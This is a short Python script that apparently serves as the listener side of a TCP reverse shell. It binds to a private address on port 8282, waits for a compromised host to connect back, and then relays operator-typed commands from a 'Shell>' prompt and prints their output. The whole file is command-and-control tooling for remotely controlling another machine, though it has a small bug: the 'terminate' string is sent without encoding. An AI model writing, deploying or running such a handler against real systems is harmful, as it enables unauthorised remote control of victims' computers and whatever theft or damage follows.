#!/usr/bin/env python3
import socket

def connect():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(("192.168.60.5", 8282))
    s.listen(1)
    print('[+] Listening for incomming TCP connection on port 8282')
    conn, addr = s.accept()
    print('[+] We got a connection from: ', addr)

    while True:
        command = input('Shell> ')
        if 'terminate' in command:
            conn.send('terminate')
            conn.close()
            break
        else:
            conn.send(command.encode("utf-8"))
            print(conn.recv(1024))

def main ():
    connect()

main()
# if __name__=='__main__':
#     main()
